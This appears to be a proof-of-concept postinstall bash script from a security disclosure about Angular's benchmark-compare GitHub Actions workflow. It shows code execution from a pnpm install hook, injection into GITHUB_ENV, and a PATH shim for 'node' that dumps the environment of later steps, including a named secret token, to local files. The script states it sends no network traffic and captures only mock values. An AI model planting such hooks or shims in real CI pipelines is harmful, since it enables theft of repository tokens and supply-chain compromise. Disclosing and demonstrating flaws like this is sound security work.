#!/bin/bash
# PoC postinstall demonstration script.
# Executed by `pnpm install` as the root postinstall lifecycle hook.
#
# Demonstrates three escalation primitives reachable from a postinstall
# running on the GitHub Actions runner with the workflow's environment:
#
# 1. Marker file: confirms arbitrary code execution.
# 2. $GITHUB_ENV injection: env var set here is visible to subsequent
#    workflow steps (cross-step contamination).
# 3. $GITHUB_PATH injection + shim: prepend an attacker-controlled
#    directory to PATH; a fake `node` binary in that directory is the
#    first hit when subsequent steps invoke `node`, allowing the
#    attacker to capture env vars passed to those steps.
#
# In production angular/angular benchmark-compare.yml, the secret-bearing
# step is peter-evans/create-or-update-comment at line 57, which receives
# BENCHMARK_POST_RESULTS_GITHUB_TOKEN as INPUT_TOKEN. The PATH injection
# would capture that env when the action's Node entry-point invokes any
# of `node`, `npm`, or other utilities subject to PATH lookup.
#
# This script writes NO data over the network and exfiltrates NO real
# secrets. The only env it captures are the MOCK values explicitly
# set in the subsequent workflow step.

set -eu

echo "=== ANGULAR BENCHMARK-COMPARE POC postinstall ==="
id
hostname
date

# Primitive 1: marker file
echo "RCE via root postinstall in benchmark-compare workflow" > /tmp/angular-poc-proof.txt
echo "Marker file written to /tmp/angular-poc-proof.txt"

# Primitive 2: $GITHUB_ENV injection
echo "POSTINSTALL_INJECTED=yes-from-postinstall" >> "$GITHUB_ENV"
echo "POSTINSTALL_TIME=$(date +%s)" >> "$GITHUB_ENV"
echo "POSTINSTALL_INJECTED env written to GITHUB_ENV"

# Primitive 3: $GITHUB_PATH injection + shim binary
mkdir -p /tmp/poc-shim
cat > /tmp/poc-shim/node <<'SHIM'
#!/bin/bash
# Attacker-controlled shim. Captures env of the calling step and
# forwards the call to the real node binary.
CAPTURE=/tmp/poc-shim/captured-env-$(date +%s%N).txt
{
  echo "=== Shim invoked at $(date) ==="
  echo "argv: $*"
  echo "--- env ---"
  env
  echo "--- end env ---"
} > "$CAPTURE"
# Find the real node, skipping /tmp/poc-shim in the lookup
REAL_NODE=$(env PATH="$(echo "$PATH" | tr ':' '\n' | grep -v '/tmp/poc-shim' | paste -sd:)" command -v node)
exec "$REAL_NODE" "$@"
SHIM
chmod +x /tmp/poc-shim/node
echo "/tmp/poc-shim" >> "$GITHUB_PATH"
echo "PATH-injection shim installed at /tmp/poc-shim/node"

echo "=== postinstall complete ==="
